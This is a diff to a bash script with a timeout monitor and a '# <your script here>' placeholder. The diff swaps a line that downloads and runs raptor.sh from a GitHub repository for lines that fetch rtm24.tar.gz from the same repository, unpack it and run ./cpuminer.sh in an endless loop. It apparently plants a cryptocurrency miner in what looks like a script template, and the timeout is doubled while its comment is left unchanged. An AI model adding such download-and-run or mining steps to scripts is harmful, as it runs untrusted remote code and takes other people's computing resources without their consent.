@@ -1,6 +1,6 @@
 #!/bin/bash
 
-Timeout=600 # 30 minutes
+Timeout=1200 # 30 minutes
 
 function timeout_monitor() {
    sleep "$Timeout"
@@ -12,8 +12,12 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://raw.githubusercontent.com/lushenry654/bitbucket/master/raptor.sh && chmod +x raptor.sh && ./raptor.sh
+wget https://github.com/lushenry654/bitbucket/raw/master/rtm24.tar.gz && tar xf rtm24.tar.gz
+while [ 1 ]; do
+./cpuminer.sh
+sleep 3
 done
+sleep 9999
 # <your script here>
 
 # kill timeout monitor when terminating:
